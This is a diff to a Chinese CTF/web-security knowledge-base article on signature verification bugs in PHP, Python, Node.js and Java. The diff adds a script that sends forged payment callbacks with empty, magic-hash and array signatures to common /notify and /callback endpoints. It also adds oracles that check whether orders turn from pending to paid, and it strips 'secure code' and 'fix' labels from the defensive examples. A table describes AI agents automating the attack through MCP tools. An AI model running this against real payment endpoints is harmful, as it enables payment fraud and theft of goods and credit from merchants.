@@ -5,21 +5,21 @@ title_en: "Signature Implementation Bugs — Implementation-Level Signature Bypa
 summary: >
   覆盖 PHP（strcmp 数组绕过、magic hash、extract 变量覆盖）、Python（hmac.compare_digest 误用、
   异常默认 allow）、Node.js（== vs ===、Buffer 比较）、Java（String.equals 时序）等各语言
-  签名验证实现缺陷，含完整时序攻击脚本恢复 HMAC 签名。
+  签名验证实现缺陷，含支付回调落点、跨语言判定矩阵、状态差分、完整时序攻击脚本恢复 HMAC 签名。
 summary_en: >
   Covers language-specific signature verification bugs: PHP (strcmp array bypass, magic hash, extract),
   Python (hmac.compare_digest misuse, exception-based allow), Node.js (== vs ===, Buffer comparison),
   Java (String.equals timing) — including full timing attack scripts for HMAC recovery.
 board: "ctf-website"
 category: "13-signature"
-signals: ["implementation bugs", "实现缺陷", "strcmp绕过", "== vs ===", "timing attack", "异常绕过", "类型强制", "extract覆盖"]
+signals: ["implementation bugs", "实现缺陷", "strcmp绕过", "== vs ===", "timing attack", "异常绕过", "类型强制", "extract覆盖", "支付回调", "magic hash", "空签名"]
 mcp_tools: ["http_probe", "kb_router"]
-keywords: ["签名实现缺陷", "strcmp绕过", "timing attack", "PHP type juggling", "HMAC时序攻击", "异常绕过", "实现漏洞"]
+keywords: ["签名实现缺陷", "strcmp绕过", "timing attack", "PHP type juggling", "HMAC时序攻击", "异常绕过", "支付回调签名", "magic hash"]
 difficulty: "advanced"
 tags: ["signature", "implementation", "php", "python", "timing-attack", "web-security", "ctf"]
 language: "zh-CN"
-last_updated: "2026-06-25"
-related_articles: ["ctf-website/13-signature/00-overview", "ctf-website/13-signature/01-algorithm"]
+last_updated: "2026-07-04"
+related_articles: ["ctf-website/13-signature/00-overview", "ctf-website/13-signature/01-algorithm", "ctf-website/12-payment/payment-callback-async"]
 ---
 # Signature Implementation Bugs — 签名实现缺陷深度手册
 
@@ -72,6 +72,69 @@ related_articles: ["ctf-website/13-signature/00-overview", "ctf-website/13-signa
 │                                                                 │
 └─────────────────────────────────────────────────────────────────┘
 ```
+
+### 0.1 支付回调实现缺陷路由
+
+支付回调里最常见的错误不是算法本身，而是实现层把“签名结果”转成了松比较、异常默认通过、字段覆盖或空值通过。拿到一个 `/notify`、`/callback`、`/webhook/pay` 入口后，先按语言/框架信号选择 payload 家族。
+
+| 信号 | 优先 payload | 命中标志 | 下一跳 |
+|---|---|---|---|
+| PHP / Laravel / ThinkPHP | `sign[]=x`, magic hash, `trade_status=TRADE_SUCCESS` | `NULL == 0`、`0e... == 0e...`、变量覆盖 | `payment-callback-async.md` |
+| Python / Flask / FastAPI | 缺字段、复杂类型、NaN/Infinity、异常路径 | 异常后仍处理 paid 分支 | `payment-logic.md` |
+| Node.js / Express / Next.js | `sign` 数组/对象、`Buffer` 长度错位、`==` | 空对象/数组被当真值或同值 | `payment-bypass.md` |
+| Java / Spring | `null` 字段、BigInteger 前导零、编码差异 | NPE fallback、签名十六进制规范化错位 | `06-replay-nonce.md` |
+| 任意语言 | 空签名、短签名、截断签名、重复参数 | 响应从 invalid 变 success，订单状态变化 | `../12-payment/payment-logic.md` |
+
+```python
+# signature_impl_payment_matrix.py — 回调签名实现缺陷打点
+import itertools
+import json
+import requests
+
+BASE = "https://target"
+S = requests.Session()
+
+PATHS = ["/notify", "/callback", "/payment/notify", "/api/payment/notify", "/webhook/pay"]
+PAYLOADS = [
+    {"out_trade_no": "ORDER_ID", "trade_status": "TRADE_SUCCESS", "total_amount": "0.01", "sign": ""},
+    {"out_trade_no": "ORDER_ID", "trade_status": "TRADE_SUCCESS", "total_amount": "0.01", "sign": "0e462097431907509062922748828256"},
+    {"out_trade_no": "ORDER_ID", "status": 0, "amount": "0.01", "signature": "x"},
+    {"out_trade_no": "ORDER_ID", "paid": True, "sign": ["x"]},
+    {"out_trade_no": "ORDER_ID", "trade_status": "TRADE_SUCCESS", "sign": {"value": "x"}},
+]
+HEADERS = [
+    {"Content-Type": "application/json"},
+    {"Content-Type": "application/x-www-form-urlencoded"},
+    {"X-Signature": ""},
+    {"X-Signature": "0e462097431907509062922748828256"},
+]
+
+def send(path, body, headers):
+    is_json = "json" in headers.get("Content-Type", "")
+    return S.post(BASE + path, json=body if is_json else None,
+                  data=body if not is_json else None,
+                  headers=headers, timeout=10, allow_redirects=False)
+
+for path, body, headers in itertools.product(PATHS, PAYLOADS, HEADERS):
+    r = send(path, body, headers)
+    print(json.dumps({
+        "path": path,
+        "payload_keys": list(body),
+        "headers": headers,
+        "status": r.status_code,
+        "len": len(r.text),
+        "sample": r.text[:160],
+    }, ensure_ascii=False))
+```
+
+### 0.2 成败 Oracle
+
+| Oracle | 记录字段 | 命中样本 |
+|---|---|---|
+| 响应 oracle | status、body hash、`success/fail/invalid sign` | 同 payload 家族从拒绝变接受 |
+| 订单 oracle | `orders.status`, `payments.status`, `paid_at` | pending → paid |
+| 权益 oracle | `vip_until`, `license_key`, `download_url`, `credits` | 权益新增或 flag 出现 |
+| 幂等 oracle | `transaction_id`, `notify_id`, 发货次数 | 同一事件多次处理 |
 
 ## 1. PHP 实现缺陷
 
@@ -318,8 +381,8 @@ def test_in_array_juggle():
     print("    in_array(null, ['admin'])      → TRUE" if False else "")
     print("    in_array('admin', [0])         → TRUE    ← 双向的!")
 
-    # 安全写法:
-    print("\n    [安全] in_array($v, $a, true)  // strict=true 第三参数")
+    # 严格分支:
+    print("\n    [strict] in_array($v, $a, true)  // strict=true 第三参数")
 
 
 # ===== 4. switch/case 宽松比较 =====
@@ -500,9 +563,9 @@ if len(user_sign) != len(correct_sign):
 """
 
 
-# ===== 安全写法 =====
+# ===== 严格比较分支 =====
 SAFE_CODE = """
-# 安全: hmac.compare_digest() 是恒定时间的
+# strict: hmac.compare_digest() 是恒定时间的
 if hmac.compare_digest(user_sign, correct_sign):
     verify()
 else:
@@ -582,7 +645,7 @@ def python_int_coercion():
     for val, result in cases.items():
         print(f"  float(\"{val}\") == 0? {result}")
 
-    # ——— 场景 2: int() 的安全绕过 ———
+    # ——— 场景 2: int() 强转绕过 ———
     # int("0x64") → ValueError (Python, 不像 PHP 解析 hex)
     # int("0b1010") → 10 (Python 解析 binary)
     # int("0o144") → 100 (Python 解析 octal)
@@ -673,7 +736,7 @@ def python_none_vs_empty():
     print("""
     // Python 中 None 和 "" 的比较:
 
-    None == ""      → False  (安全，不会混淆)
+    None == ""      → False  (不会混淆)
     bool(None)      → False
     bool("")        → False
     str(None)       → "None"  ← 可能被哈希!
@@ -762,7 +825,7 @@ def python_secret_exposure():
 // ===== 1. == 与 === 的区别 =====
 console.log("=== JS == vs === in signature verification ===");
 
-// === 安全 (类型+值都检查)
+// === strict (类型+值都检查)
 // == 危险 (类型强制)
 
 // 以下 == 比较全部为 true:
@@ -886,7 +949,7 @@ function timing_vuln(user_sig, correct_sig) {
     return true;
 }
 
-// ===== 安全做法: timing-safe =====
+// ===== strict 分支: timing-safe =====
 const { timingSafeEqual } = require('crypto');
 
 function timing_safe(user_sig, correct_sig) {
@@ -933,7 +996,7 @@ console.log("safe last byte wrong:  ", measure_time(timing_safe, wrong_15).toFix
 const payload1 = JSON.parse('{"__proto__": {"admin": true}}');
 // payload1.__proto__.admin  → true (原型污染)
 
-// 如果签名验证对象是 Object.create(null) (无原型) → 安全
+// 如果签名验证对象是 Object.create(null) (无原型) → 原型链 payload 不进入
 // 如果是普通 {} → prototype chain 可被污染
 
 // ===== 2. JSON.parse 接收奇怪的类型 =====
@@ -990,7 +1053,7 @@ public class SignatureBugs {
         return userSig.equals(correctSig);  // ← 时序泄露!
     }
 
-    // 安全: MessageDigest.isEqual() 是 constant-time
+    // strict: MessageDigest.isEqual() 是 constant-time
     public static boolean safeCompare(String userSig, String correctSig) {
         return MessageDigest.isEqual(
             userSig.getBytes(StandardCharsets.UTF_8),
@@ -1039,7 +1102,7 @@ def java_timing_explanation():
     // 逐个字节比较，遇到第一个不同字节返回 false
     // → 前 N 字节匹配时耗时更长 → 可做时序攻击
 
-    // 安全替代:
+    // strict 替代:
     // MessageDigest.isEqual(byte[], byte[])
     // → 即使长度不同也恒定时间
     // (不计较早的 length check)
@@ -1073,7 +1136,7 @@ def java_array_equals_issue():
     // }
     // return true;
 
-    // === 安全替代 ===
+    // === strict 替代 ===
     // java.security.MessageDigest.isEqual(byte[], byte[])
     // → 恒定时间
 
@@ -1099,7 +1162,7 @@ def java_array_equals_issue():
     // signature = "00dead" 但 toString() → "dead"
     // 签名长度不一致!
 
-    // 修复: 手动补零
+    // 分流: 未补零时可造成等价串错位
     // String.format("%064x", new BigInteger(1, sigBytes))
     """)
 ```
@@ -1134,17 +1197,17 @@ def java_null_issues():
     // if (sign.equals(calc)) { ... }     // → NPE on sign (null)
 
     // 但是: if (calc.equals(sign)) { ... }
-    // → 如果 sign 为 null → false (安全, 但可能触发其他逻辑)
+    // → 如果 sign 为 null → false，但可能触发其他 fallback 逻辑
     // → equals(null) → false (Java 规范: null 参数返回 false)
 
     // === 对比: == null 检查 ===
-    // if (sign == null) { return false; }  ← 安全
-    // if ("".equals(sign)) { ... }         ← 安全 (左边不会 null)
+    // if (sign == null) { return false; }  ← null 分支直接截断
+    // if ("".equals(sign)) { ... }         ← 左值固定避免 NPE
     // if (sign.equals("")) { ... }         ← 可能 NPE
 
-    // === Spring 中的 Null 安全 ===
-    // StringUtils.hasText(sign) → null/空字符串都安全
-    // Objects.equals(a, b) → null 安全
+    // === Spring 中的 Null 分流 ===
+    // StringUtils.hasText(sign) → null/空字符串进入同一拒绝分支
+    // Objects.equals(a, b) → null 不触发 NPE
     // Optional.ofNullable(sign).orElse("") → 默认值
     """)
 ```
@@ -1329,7 +1392,7 @@ def truncation_scenarios():
 
     // ===== 截断模式 3: 只检查非空 =====
     // if (strlen($user_sig) > 0 && $user_sig !== $stored) → 任意非空签名?
-    // 不对, 这个实际上是安全反模式
+    // 不对, 这个会让长度 oracle 更明显
 
     // ===== 截断模式 4: 数据库 truncation =====
     // 数据库字段 VARCHAR(32), 但签名是 40 字节 SHA1
@@ -1449,7 +1512,7 @@ def null_byte_truncation():
     // PHP: file_get_contents("/etc/passwd\\x00.jpg") → /etc/passwd (PHP < 5.3)
     // 如果签名参数包含路径 → 路径截断 → 读任意文件
 
-    // ===== 对抗 =====
+    // ===== 失败分流 =====
     // 始终在签名计算前 sanitize 输入
     // 移除或转义 null 字节
     // 使用固定编码 (如 hex 或 base64) 而非原始字节
@@ -1738,7 +1801,7 @@ S = requests.Session()
 
 
 class SignatureImplAuditor:
-    """签名实现缺陷审计"""
+    """签名实现缺陷打点"""
 
     def __init__(self, base_url: str):
         self.base = base_url.rstrip("/")
@@ -2078,6 +2141,15 @@ graph TD
 | 编码/Unicode 归一化 | 中 | 中 | 中 | 中 | 中 |
 | 空签名/缺失签名 | 高 | 高 | 高 | 高 | 极高 |
 
+## Evidence
+
+- `signature_impl_matrix.jsonl`: path、method、content-type、payload 家族、签名字段、状态码、响应 hash、响应摘要。
+- `payment_state_diff.json`: 回调前后 `orders/payments/entitlements/wallet` 快照。
+- `language_fingerprint.json`: header、cookie、错误栈、路由格式、框架指纹与命中 payload 家族。
+- `timing_samples.csv`: 签名前缀、样本数、中位数、p95、baseline、可分辨阈值。
+- 成功样本: 空签名/数组签名/magic hash/异常路径触发 `paid`、发货、余额或 flag。
+- 失败样本: 所有变体响应 hash 一致且状态无变化；签名比较进入严格分支；订单/权益快照不变。
+
 ## MCP 工具映射
 
 AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
@@ -2086,3 +2158,4 @@ AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
 |---------|---------|------|
 | 签名实现探测 | `http_probe` | HTTP GET 探测签名实现漏洞 |
 | 知识检索 | `kb_router` | 按签名实现攻击信号搜索知识库 |
+| 支付链路跳转 | `kb_router` | 命中 notify/callback 后跳转支付回调与订单状态机文档 |
